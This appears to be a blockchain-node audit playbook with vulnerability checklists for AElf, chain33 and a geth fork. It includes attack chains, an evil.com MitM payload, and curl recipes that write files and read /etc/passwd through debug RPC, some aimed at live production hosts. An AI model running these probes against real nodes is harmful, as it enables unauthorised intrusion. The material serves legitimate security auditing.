|1|Hardcoded secrets `appsettings.json`| `src/AElf.Launcher/appsettings.json:8-9,12-13,42-44` `appsettings.*.json` | `grep -rn "ConnectionStrings\|NodeAccountPassword\|BasicAuth\|MySql\|RabbitMQ\|StringEncryption" src/` | Empty `NodeAccountPassword`→ scrypt with "" ; `redis://localhost:6379?db=1` unauth if `bind 0.0.0.0` |
|2|CORS `CorsOrigins *`| `appsettings.json:6` `Startup.cs:53-66` + `AElf.Cluster/Application/Startup.cs:24-28` | `grep -rn "CorsOrigins\|AllowAnyOrigin\|AddCors"` | `WithOrigins("*")` + `AllowAnyHeader/Method` + `AllowCredentials` fallback → any origin calls `http://*:8000/api/*` |
|3|Internal IPs `192.168.*`|`docs/tutorials/setup/docker-multi-node.md:92` etc | `grep -rn "192\.168"` | Doc examples `192.168.1.70` — info leak if copied to prod; verify not in runtime config |
|4|Missing TLS|`appsettings.json:19-22` `Kestrel:Http Url http://*:8000/` `TlsHelper.cs:50` `SetNotAfter MaxValue` | `grep -rn "Kestrel\|RequireHttps\|TlsHelper"` | No `Https` endpoint, no cert, self-signed 9999 expiry, no CA pin → MITM; `docker-compose.yml` exposes 6800/8000 plain |
|5|Private key / admin single point|`contract/.../BridgeContract.cs:16,43,51,84,105,131` `AElfKeyStore.cs:22` `AccountService.cs:62-81` | `grep -rn "Admin\|Controller\|PauseController\|NodeAccount\|keyStore"` | `Admin` EOA alone can `ChangeAdmin/Controller/Pause/SetTokenPool`; `PauseController` can DOS; keys in `keys/*.json` encrypted with empty password |
|6|Upgradeability org check|`MainChainAElfModule.cs:39` `ContractDeploymentAuthorityRequired=false` `BridgeContract.cs:92-96 ValidateOrganizationExists` | `grep -rn "ContractDeploymentAuthority\|ValidateOrganizationExist\|Parliament\|Association"` | Boilerplate ships `false`; only `FeeRatio/Restart` validate org, other admin setters skip Parliament/Association |
|7|Log leakage|`Program.cs:45 ClearProviders` `AElfKeyStore.cs:50 LogError` | `grep -rn "Serilog\|UseSerilog\|Log.*Password\|Log.*Private"` | No Serilog; but check `Console.WriteLine(e)` + `Invalid password` oracle |
|8|Supply chain|`Directory.Build.props` `nuget.config:3-6` `common.props` | `cat nuget.config; cat Directory.Build.props` | Extra feed `int.nugettest.org/api/v2` enables dependency confusion; MyGet unauth; `Version $(VersionSuffix)` without lock |
|9|Dockerfile|`src/AElf.Launcher/Dockerfile:1` `docker-compose.yml:3-10` `scripts/deploy_docker.sh:10` | `find -name Dockerfile` | `dotnet/core/sdk:3.1` EOL, `COPY . .` leaks secrets, `docker login -p` leaks via `ps`, `volumes:/opt:/opt` host mount |

Workflow: enumerate `appsettings*.json` first, then grep each checklist item, then map admin graph (`BridgeContractState.cs` + `TokenPoolContract.cs:20` commented `GetContractAuthor`), then confirm TLS/CORS wiring in `Startup.cs`. See `examples/hunts/web3/blockchain-node-audit/references/sisir-deploy-ops-weakness.md` for full evidence template and ebridge-specific false-positive trap (pure contracts repo has no `appsettings.json`).

## Chain33 / Go Tendermint-Style Node Blind-Spot Checklist (AUDITOR-4 Pattern)

Derived from AUDITOR-4 blind-spot audit of `33cn/chain33` (`/tmp/audit_blindspot.md`, 2026-08-16). Use when prior auditors claim "fixed" on webhook/P2P/RPC — these 9 surfaces are what they miss.

| # | Checklist | File:line Anchor | Grep | Why "Looks Fixed" But Isn't |
|---|-----------|------------------|------|------------------------------|
| B1 | Webhook CI RCE — attacker controls `Makefile`, server runs `make webhook` | `cmd/webhook/main.go:22,101` `safeNamePattern=^[a-zA-Z0-9._-]+$` | `grep -rn "exec.Command\|make webhook\|GOPATH\|safeName" cmd/webhook --include="*.go"` | `safeNamePattern` stops `;` but not `..` and not the `Makefile` itself — any GitHub user can own `attacker/chain33` and get RCE; `rm -rf $gitpath` with `..` escapes `GOPATH` |
| B2 | P2P gossip signing disabled | `system/p2p/dht/extension/pubsub.go:120` `WithMessageSigning(false), WithStrictSignatureVerification(false)` | `grep -rn "WithMessageSigning\|WithStrictSignature" system/p2p --include="*.go"` | `protocol/wrapper.go:AuthenticateMessage` exists for `p2pstore` only; `broadcast` pubsub is globally unsigned — spoof tx/block gossip |
| B3 | CORS Allow-All on every HTTP listener | `rpc/http.go:56` `cors.New(cors.Options{})`; `rpc/ethrpc/rpc.go:143` `NewHTTPHandlerStack(..., ["*"])` | `grep -rn "cors.New\|NewHTTPHandlerStack\|WebsocketHandler" rpc --include="*.go" -A2` | Empty `cors.Options{}` = `AllowAll` (`*`); preflight fix `OPTION→OPTIONS` is cosmetic while policy is `*` |
| B4 | `IsPublicIP` incomplete deny-list | `common/utils/ip.go:14-32` | `grep -rn "IsPublicIP" --include="*.go"` | Misses `0.0.0.0/8`, `100.64.0.0/10` CGNAT, `192.0.2.0/24`/`198.51.100.0/24`/`203.0.113.0/24`, `224.0.0.0/4` multicast, all IPv6; test `224.0.0.1→false` fails |
| B5 | ETH-RPC skips `checkBasicAuth` | `rpc/ethrpc/rpc.go:219` vs `rpc/http.go:72` `checkBasicAuth` | `grep -rn "checkBasicAuth\|checkIPWhitelist" rpc --include="*.go"` | jRPC checks IP+BasicAuth; ethrpc copies IP check only — `jrpcUserName`/`Passwd` gives false sense of 8545 protection |
| B6 | Pprof unconditional on `:6060` | `util/cli/chain33.go:136-147` `else { ListenAndServe("localhost:6060",nil)}` + `_ "net/http/pprof"` | `grep -rn "pprof\|ListenAndServe.*6060" util --include="*.go"` | Thought opt-in via `cfg.Pprof`; `else` binds even when unconfigured; `/debug/pprof/*` leaks heap/goroutine/cmdline pre-auth |
| B7 | `jsonclient` SSRF/DoS primitives | `rpc/jsonclient/jsonclient.go:42-54,79-84` `http.DefaultClient` `ReadAll` `InsecureSkipVerify=!tlsVerify` | `grep -rn "NewJSONClient\|InsecureSkipVerify\|ReadAll" rpc/jsonclient --include="*.go"` | No `Timeout`, no `io.LimitReader`, default `InsecureSkipVerify=true`; URL from config becomes SSRF gadget, large body → OOM |
| B8 | Store `DbPath` traversal via TOML | `common/db/go_level_db.go:69` `path.Join(dir,name+".db")`; `system/p2p/dht/addrbook.go:39` `cfg.DbPath+"/"+DHTTypeName` | `grep -rn "DbPath\|NewDB" common/db system/p2p system/store --include="*.go"` | `DbPath` from TOML used verbatim without `filepath.Clean`/prefix check; malicious `datadir` in `blockchain/export_block.go:378` also traverses |
| B9 | `safeNamePattern` allows `..` | `cmd/webhook/main.go:22` `^[a-zA-Z0-9._-]+$` | same as B1 | `.` in charset means `..` passes; `gitpath=GOPATH+"/src/github.com/"+user+"/chain33"` then resolves outside `GOPATH/src/github.com` |

**Workflow (add to Phase 2 Secret Hunt / Phase 3 Endpoint Mapping):**
1. `grep -rn "WithMessageSigning" system/p2p` → must be `true` for broadcast, not just p2pstore.
2. `grep -rn "cors.New" rpc --include="*.go"` → empty `Options{}` = finding; compare origins against `whitelist` config.
3. `grep -rn "IsPublicIP" common/utils --include="*.go" -A15` → diff against IANA `0/8, 10/8, 100.64/10, 127/8, 169.254/16, 172.16/12, 192.0.2/24, 192.88.99/24, 198.18/15, 198.51.100/24, 203.0.113/24, 224/4, fc00::/7, fe80::/10, ff00::/8`.
4. `grep -rn "WEBHOOK_SECRET" cmd/webhook` + read `make webhook` target → attacker Makefile = RCE by design; require org allow-list + `filepath.Clean` + prefix check.
5. `grep -rn "pprof" util/cmd --include="*.go"` → flag unconditional `else ListenAndServe("localhost:6060")`.
6. `grep -rn "InsecureSkipVerify\|http.DefaultClient" rpc/jsonclient` → add `Timeout` + `LimitReader(4<<20)` + default `false`.
7. `grep -rn "DbPath" common/db` → verify `Clean` + `strings.HasPrefix(cleanPath, cleanDatadir)`.

Pre-mortem: each "fix" above has a "what if wrong" proof in `examples/hunts/web3/blockchain-node-audit/references/chain33-blindspot-audit-2026-08-16.md` §3 (e.g. `..` PoC, gossip spoof PoC, CORS `fetch` from `evil.com`, `224.0.0.1` test).

## Go/Geth-Fork Node Audit (Abey / go-ethereum Dual-Chain Pattern)

Derived from AbeyFoundation `go-abey` audit (2026-08: 807 Go files, 131k code, 247k lines; `abey-wallet-module` 210 Dart/25k). Dual-chain geth fork: `fast` chain + `snail` chain (fruits/snailblocks), ChainID 179 mainnet / 178 testnet, consensus `Minerva` (PoW) + `TBFT` (BFT) + `election`, EVM `core/vm` with `extimpawn/impawn`.

### Geth-Fork Trust Boundaries

| # | Boundary | Ingress | Gate | Sink |
|---|----------|---------|------|------|
| G1 | JSON-RPC HTTP/WS/IPC | `:8545`/`:8546`/`gabey.ipc` JSON-RPC 2.0 batch+pubsub | `rpc.Server.RegisterName` + `node.startHTTP/WS/IPC` + `HTTPModules`/`WSModules` whitelist + `rpc/http.go:newCorsHandler/newVHostHandler` | `internal/abeyapi/*`, `abey/*`, `node/*` |
| G2 | P2P devp2p | `:30313` rlpx/discv5/enr/nat | `p2p.Config{MaxPeers:100, TrustedNodes, NoDiscovery, NoDial}` | `core.BlockChain.InsertChain`, `abey/downloader`, `abey/fetcher` |
| G3 | Wallet client | mnemonic/keystore/passwd/QR | `lib/utils/chain_util.dart` + `bee_encryption/abey_encryption` → `sqflite`/`shared_preferences` | key material at rest |
| G4 | Node config/CLI | `gabey --config TOML` + `--rpcapi --rpccorsdomain --wsorigins` | `cmd/gabey/config.go:defaultNodeConfig` + `cmd/utils/flags.go` | module exposure flag |
| G5 | IPC | `gabey.ipc` UNIX socket | `node/IPCEndpoint()` filesystem ACL only | same as RPC, no CORS |
| G6 | Consensus gossip | block/fruit propagation | `consensus/tbft/reactor.go`, `core/block_validator.go` | state transition + rewards |

### Geth-Fork High-Risk Sink Checklist

| # | Sink | File:line Anchor | Grep | Impact |
|---|------|------------------|------|--------|
| G1 | `personal_unlockAccount` indefinite unlock | `internal/abeyapi/api.go:404` `TimedUnlock(addr,passwd,duration)` default 300s, `max=MathMaxInt64` | `grep -rn "TimedUnlock\|UnlockAccount" internal/abeyapi accounts/keystore` | brute-force → `signTransaction` → fund theft |
| G2 | `personal_importRawKey` / `newAccount` | `internal/abeyapi/api.go:377,392` hex privkey→keystore file | `grep -rn "ImportRawKey\|NewAccount" internal/abeyapi` | weak passwd, no rate limit, keystore write |
| G3 | `eth/abey_sendRawTransaction` unauth | `internal/abeyapi/api.go:1925,2554` `hexutil.Bytes→rlp.Decode→b.SendTx` `Public:true` | `grep -rn "SendRawTransaction" internal/abeyapi` | RLP bomb, sig malleability, replay if ChainID unchecked, gas DoS |
| G4 | `personal/eth_sendTransaction` (eth variant Public!) | `internal/abeyapi/api.go:1882` `PublicTransactionPoolAPI.SendTransaction` no passwd | `grep -rn "PublicTransactionPoolAPI.*SendTransaction" internal/abeyapi` | unauth tx injection if module exposed |
| G5 | `admin_*` file R/W + chain import | `abey/api.go:321` `ExportChain(file)` `os.OpenFile(file,O_CREATE)`, `ImportChain(file)` `rlp.NewStream→InsertChain`; `node/api.go:PrivateAdminAPI` `AddPeer(enode) AddTrustedPeer StartRPC` | `grep -rn "PrivateAdminAPI\|ExportChain\|ImportChain\|AddTrustedPeer" abey node` | arbitrary file write/read, RLP chain bomb, peer eclipse |
| G6 | `miner_*` control | `abey/api.go:194` `PrivateMinerAPI.Start/Stop/SetEtherbase/SetGasPrice/SetExtra/SetElection` | `grep -rn "PrivateMinerAPI\|PublicMinerAPI" abey` | hashrate/coinbase manipulation |
| G7 | `debug_*` state dump public | `abey/api.go:416` `PublicDebugAPI.DumpBlock` → `stateDb.RawDump()`; `node/api.go:debug.Handler` | `grep -rn "PublicDebugAPI\|PrivateDebugAPI" abey node internal/abeyapi` | full state leak if operator adds `debug` to `HTTPModules` |
| G8 | `--singlenode` hardcoded key | `cmd/gabey/config.go:100` `prikey,_:=crypto.HexToECDSA("<redacted>")` | `grep -rn "<redacted>\|PrivateKey.*HexToECDSA\|SingleNodeFlag" cmd` | instant compromise of any `--singlenode` network; test for prod reuse |
| G9 | P2P trusted-peer MaxPeers bypass | `p2p/server.go:348,634` `AddTrustedPeer` not counted in `MaxPeers` | `grep -rn "AddTrustedPeer\|TrustedNodes" p2p` | single trusted enode eclipse |
| G10 | Wallet weak encryption + MitM | `lib/utils/common_util.dart:77` `encrypt(token,authKey)` via `bee_encryption`; `lib/wallet/web3dart/core/client.dart` dio HTTP no pinning | `grep -rn "shared_preferences\|sqflite\|bee_encryption\|CommonUtil.encrypt" lib` | offline brute-force from sqflite, RPC MitM to `rpc.abeychain.com` |
| G11 | `debug_write*` arbitrary file write (pprof) | `internal/debug/api.go:104,161,181,188,213` `os.Create(expandHome(file))` via `writeProfile(name,file)` + `debug.Handler` registered in `node/node.go:622` (Public=false but still via `StartHTTPEndpoint` when `debug` in `HTTPModules`) | `grep -rn "WriteMemProfile\|WriteBlockProfile\|WriteMutexProfile\|StartCPUProfile\|expandHome" internal/debug --include="*.go"` | world-writable write (`/tmp`/`/var/tmp`/`/dev/shm`) pre-auth, pprof binary content not attacker-controlled → DoS/info-leak, RCE only if node runs as root or writable datadir/cron |
| G12 | `debug_trace*` arbitrary JS via duktape | `abey/tracers/tracer.go:310` `duktape.New()+PevalString("("+code+")")` + `abey/api_tracer.go:55 TraceConfig{Tracer *string}` → `tracers.New(*config.Tracer)` | `grep -rn "PevalString\|EvalString\|go-duktape\|TraceConfig" abey --include="*.go"` | JS exec inside tracer VM pre-auth if `debug` exposed; not full host RCE but VM escape/DoS, plus `call_tracer.js` etc allowlist bypass |
| G13 | P2P bootnodes hardcode / eclipse | `params/bootnodes.go:22` `MainnetBootnodes` 6 enodes (lead `3.66.27.8:30313` Frankfort AWS) + `params/bootnodes.go:33` Testnet `10.0.196.x` leak + `p2p/dial.go:201` fallback `if len(peers)==0 && needDynDials>0 && now.Sub(start)>fallbackInterval { bootnode:=s.bootnodes[0] }` | `grep -rn "MainnetBootnodes\|bootnode" params p2p --include="*.go" | grep -v build/_workspace` | single IP/DNS compromise → eclipse; ` --bootnodes` flag can override but docs push hardcode; Testnet private IPs useless on public net |

### Geth-Fork Endpoint Mapping Workflow

1. **Enumerate modules:** `grep -rn "GetAPIs\|APIs()\|Namespace:" internal/abeyapi abey node --include="*.go"` → tables of `Namespace`/`Public:true|false`/`Service`. `abey/backend.go:321` registers `abey/eth` (4 public: AbeychainAPI, MinerAPI, DownloaderAPI, FilterAPI) + `miner/admin/debug/net`.
2. **Resolve default exposure:** `node/defaults.go:DefaultConfig` (`HTTPModules=[net,web3]` safe) vs `cmd/gabey/config.go:defaultNodeConfig()` appends `[abey,eth,impawn,shh]` + `WSModules+[abey]` + `IPCPath=gabey.ipc`. Then `cmd/utils/flags.go:RPCCORSDomainFlag/RPCApiFlag/WSApiFlag` overrides. `--singlenode` forces `[db,abey,net,web3,personal,admin,miner,eth]` — total compromise.
3. **Check auth gaps:** `grep -rn "HTTPCors\|HTTPVirtualHosts\|WSOrigins\|WSExposeAll\|cors.New" rpc node --include="*.go"` — default `HTTPCors localhost`, `VHosts localhost`; empty `cors.Options{}` = `AllowAll` (`rpc/http.go:225`). Verify `WSExposeAll` warning.
4. **Org recon + noise filter:** `curl api.github.com/orgs/<org>/repos` + `/users/<org>/repos` (both — org endpoint may 403 on some GitHub Enterprise). Safe/Gnosis forks are noise — detect via `fork=true` + `parent.full_name safe-global/*` + pushed 2024-06/07 + 0 stars. Core = non-fork with Go/Dart + size>3000. Tarball fallback for missing `git-remote-https` (TencentOS 4): `curl -L https://github.com/<org>/<repo>/archive/refs/heads/main.tar.gz` + `master.tar.gz` fallback; per-file `raw.githubusercontent.com` when API 403.
5. **Scale via pygount:** `pygount --format=summary <repo> --suffix=go` → `go-abey: 780 Go 131k code` → prioritize `internal/abeyapi/api.go:2721`, `core/blockchain.go:1939`, `consensus/tbft/state.go:1853`, `core/vm/impawn.go:1622`.

### Safe-Fork Noise Filter (Abey Pattern)

9/12 repos were vanilla `safe-global` forks (pushed 2024-06/07, 0 stars, `fork:true`). Skip when: `fork==true && parent in safe-global/safe-fndn && language in TypeScript/Python && size<10000 && pushed <2024-08`. Saves 75% of clone time. Verify with `languages_url` byte count — Safe forks have TS 55K-3.3M but zero Go.

## Cross-Side Wallet→Node Chains (ABEY 2026-08-16 — CHAINER Validation)

Validated from `/tmp/abey_side_report/chain.md` (5 chains, 365 lines) on go-abey 34 dirs + abey-wallet-module Flutter. Key handoff not covered by per-module audits: **remote-config JSON → RPC hijack → node file-write**.

| Chain | Trigger → Effect | Gate | Verdict | Confidence |
|---|---|---|---|---|
| **C1 Wallet MITM → RPC hijack → RCE** | `Base_Url=http://54.255.45.202:8010` (Dart constant, cleartext, `ISDEBUG=true`) → `global.dart:141 config['ABEY_RPC']` json → attacker RPC → `debug_startCPUProfile("/etc/cron.d")` | `admin,debug` HTTP + `CORS *` or WebView `loadUrl(any)` | wallet MITM proven, file-write proven (`internal/debug/api.go:98` + `abey/api.go:328`), RCE via cron/ssh | 65% chain, 95% per step |
| **C2 stacks→datadir→keystore read** | `debug_stacks` (`node/node.go:622` Public:true) + `admin_datadir` → `TraceBlockFromFile`/`ImportChain` `os.Open` no `filepath.Clean` prefix | `admin,debug` HTTP (leak part is public) | leak proven, read via error oracle partial (needs symlink ` /tmp/link → keystore` for full dump) | 80%/60% |
| **C3 CORS*+debug drive-by** | `evil.com fetch(127.0.0.1:8545 debug_*)` → `rpc/http.go:244` IP bypass + `221` CORS * → `debug_writeMemProfile` | `HTTPModules` includes `debug` + `HTTPCors=["*"]` | needs `CORS *` (not default), WS bypass blind spot | 90% if enabled, 40% live |
| **C4 Impawn staking → committee** | `impawn deposit 20000 ABEY` (`cmd/impawn/impawn.go:49`) → `election/getCommittee` | stake-weighted, permissionless | **BUNTU** — economic gate, not auth bypass | 15% takeover |
| **C5 JS tracer + empty block** | `tracers/tracer.go:310 PevalString("("+code+")")` fallback → `TraceConfig.Tracer` | `debug` exposed, duktape sandbox | **DoS only** (5s timeout, 6 globals, no `require/os/fs`) — 0day needed | 15% RCE, 85% DoS |

**Wallet remote-config injection detail (new vs G10):** `lib/common/constant.dart:5` + `lib/common/global.dart:141-158` trusts server JSON `config['ABEY_RPC']` with no signature/allowlist. MitM (ARP/DNS on `54.255.45.202`) returns `{"ABEY_RPC":"{\"url\":\"http://evil.com:8545\"}"}` → wallet routes `abey_sendAbeyRawTransaction` through attacker (log `from`, front-run, poisoned `abey_call`). Amplifier: if `lib/wallet/web3dart/core/client.dart` sets `badCertificateCallback=>true`, TLS MitM also works. WebView `common_webview.dart loadUrl(any)` allows `fetch("http://127.0.0.1:8545",...)` without CORS.

**Verification matrix (clean install → curl → ls):**
```bash
make -C /tmp/abey/go-abey gabey
rm -rf /tmp/abeytest && mkdir /tmp/abeytest && echo testtest>/tmp/pw.txt
/tmp/abey/go-abey/build/bin/gabey --datadir /tmp/abeytest account new --password /tmp/pw.txt
/tmp/abey/go-abey/build/bin/gabey --datadir /tmp/abeytest --http --http.addr 127.0.0.1 --http.port 8545 \
  --http.api abey,eth,net,admin,debug --http.corsdomain "*" --http.vhosts "*" --allow-insecure-unlock --unlock 0 --password /tmp/pw.txt &
 sleep 6
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"admin_datadir","params":[],"id":1}' http://127.0.0.1:8545 | jq .
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"debug_stacks","params":[],"id":1}' http://127.0.0.1:8545 | grep -o gabey | head
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"debug_startCPUProfile","params":["/tmp/chain_verify"],"id":1}' http://127.0.0.1:8545
ls -lh /tmp/chain_verify && echo WRITE_PROVEN
curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"debug_stopCPUProfile","params":[],"id":1}' http://127.0.0.1:8545
curl -s -i -X POST -H "Content-Type: application/json" -H "Origin: http://evil.com" -d '{"jsonrpc":"2.0","method":"debug_stacks","params":[],"id":1}' http://127.0.0.1:8545 | grep -i access-control
curl -s -X POST -H "Content-Type: application/json" -H "Host: 192.168.1.1:8545" -d '{"jsonrpc":"2.0","method":"admin_datadir","params":[],"id":1}' http://127.0.0.1:8545 | jq .
pkill -f "abeytest.*gabey"; rm /tmp/chain_verify
```

**Blind-spot & pitfalls:**
- `TraceBlockFromFile` `ioutil.ReadFile` then `rlp.Decode` fails on keystore JSON — error leaks first byte only; full dump needs `/tmp` symlink bypass. Don't claim full exfil without symlink proof.
- `validateRequest` mime check blocks `text/plain` form bypass — drive-by needs `CORS *` + `application/json` or WS upgrade (`WSOrigins` empty → allow all) as alternative.
- `debug_write*` content is pprof binary, not attacker string — classify as HIGH file-write/DoS, RCE only if writable cron/ssh/systemd and node as root or world-writable datadir.
- Wallet cache: check `preferences_util.dart` / `shared_preferences` for cached `ABEY_RPC` — poison persists after MitM ends.
- Old backend dead (`54.255.45.202:8010` timeout) ≠ safe — attacker can re-register IP/DNS or phish via DApp list injection without MitM.

See `examples/hunts/web3/blockchain-node-audit/references/abey-cross-side-chain-wallet-node-2026-08-16.md` for per-chain PoCs (≤50 lines) and `examples/hunts/web3/blockchain-node-audit/references/chain33-blindspot-audit-2026-08-16.md` style pre-mortems.

## Live RPC Probe Recipe (Geth-Fork, Lightweight — From Abey 2026-08-16 Agent-2)

Proven on `rpc.abeychain.com` (179/0xb3) and `testrpc.abeychain.com` (178/0xb2) — Mozilla UA, `Content-Type: application/json`, no brute-force. Classification that avoids false positives:

| Response | Meaning |
|---|---|
| `{"result":null}` | Sink EXECUTED (file write/profile started) — NOT gated |
| `{"error":{"code":-32601}}` | Method not available — gated by `HTTPModules`/`WSModules` (flag-dependent) |
| `{"error":{"code":-32602}}` | Method exists but missing required arg — use as control that method is registered |
| `{"error":{"code":-32000, "message":"open ...: permission denied"}}` | `os.Create` attempted, blocked by OS perms — proves `expandHome` did NOT jail (only OS stopped write) |
| `{"error":{"code":-32000, "message":"rlp: expected input list"}}` | `ioutil.ReadFile` succeeded, RLP decode failed — proves arbitrary file READ occurred |

Minimal transcript (6 calls, <2s):
```bash
curl -sL -A "Mozilla/5.0" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"abey_chainId","params":[]}' https://rpc.abeychain.com # => 0xb3
curl -sL -A "Mozilla/5.0" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"eth_accounts","params":[]}' https://rpc.abeychain.com # wallet leak? (MEDIUM if non-empty)
curl -sL -A "Mozilla/5.0" -H "Origin: https://evil.com" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"abey_chainId","params":[]}' https://rpc.abeychain.com -D - # CORS *?
curl -sL -A "Mozilla/5.0" -H "Content-Type: application/json" -d '[{"jsonrpc":"2.0","id":1,"method":"abey_chainId","params":[]},{"jsonrpc":"2.0","id":2,"method":"abey_chainId","params":[]}]' https://rpc.abeychain.com # batch?
curl -sL -A "Mozilla/5.0" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"debug_cpuProfile","params":["/tmp/pwn_test",1]}' https://rpc.abeychain.com # file-write?
curl -sL -A "Mozilla/5.0" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"debug_traceBlockFromFile","params":["/etc/passwd",{}]}' https://rpc.abeychain.com # file-read?
curl -sL -A "Mozilla/5.0" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"personal_listAccounts","params":[]}' https://rpc.abeychain.com # gating control
curl -sL -A "Mozilla/5.0" -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","id":1,"method":"debug_cpuProfile","params":[]}' https://rpc.abeychain.com # -32602 control
```

Always probe both mainnet and testrpc — testrpc often has `debug` exposed while mainnet gates `admin`/`personal` but leaves `debug` open. `http://` returns 301 on Abey; use `https://`. `http://54.255.45.202:8010` (wallet `Base_Url`) hangs → confirms cleartext legacy.

## Reference

- Case evidence from the abey, viction, chain33, multivac, plasma/ethrex, berachain/beacon-kit, multiversx, and AElf/sisir hunts (21 files: trust graphs, red-team matrices, chainer chains, fuzz transcripts, live probe logs) is preserved at `examples/hunts/web3/blockchain-node-audit/references/` — moved out of the product layer 2026-09-07; body sections above cite the individual files.
- `references/geth-debug-rpc-file-write-vector.md` — Geth-fork `debug_write*` arbitrary file write: `expandHome` analysis, content-control constraints, live-probe classification, DoS/griefing primitives, false-RCE guard (generic class writeup; kept in-repo).
- `scripts/node-audit-poc.py` — reusable node audit PoC harness.
